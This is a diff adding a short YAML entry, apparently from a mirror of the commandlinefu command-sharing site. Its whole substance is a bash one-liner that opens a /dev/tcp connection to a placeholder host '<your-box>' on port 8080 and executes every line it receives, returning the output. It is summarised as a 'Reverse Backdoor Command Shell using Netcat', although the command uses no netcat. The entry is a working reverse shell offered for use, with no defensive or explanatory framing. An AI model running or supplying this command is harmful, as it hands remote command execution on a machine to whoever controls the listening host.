@@ -1,0 +1,8 @@
+commandlinefu_id: 11529
+translator:
+  weibo: ''
+hide: true
+command: |-
+  exec 5<>/dev/tcp/<your-box>/8080;cat <&5 | while read line; do $line 2>&5 >&5; done
+summary: |-
+  Reverse Backdoor Command Shell using Netcat
